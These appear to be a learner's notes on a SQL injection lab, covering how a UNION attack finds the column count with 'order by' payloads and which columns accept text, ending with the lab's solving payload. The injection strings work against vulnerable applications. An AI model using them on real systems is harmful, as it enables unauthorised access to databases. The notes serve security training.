This lab picks up where the last one left off.

SQL Union attack
Step 1 Determine the number of columns (Previous lab)

Step 2 Determine the data types of the columns
select a,b,c from table1 UNION selct 'a', NULL, NULL
-> error, column is not a string
-> else, column is a string

-> error, select a,b,c from table1 UNION select NULL, 'a', NULL
-> error, select a,b,c from table1 UNION select NULL, NULL, 'a'

Analysis:
where category = 'gifts'
Injection: ' order by 1--
where category = 'gifts' order by 1--'
where category = 'gifts' order by 1
Injection: ' order by 2--
Injection: ' order by 3--

Injection: ' order by 4--
Gives an error, must be 3

Injection
' UNION select 'a',NULL, NULL--
Gives an error, probably because the first column is an int id not a string
' UNION select NULL,'a', NULL--
Outputs an a
' UNION select NULL,'a', 'a'--
Gives an error, probably because the third column is a number and not a string

Injection to solve:
' UNION select NULL,'iLPI67', NULL--
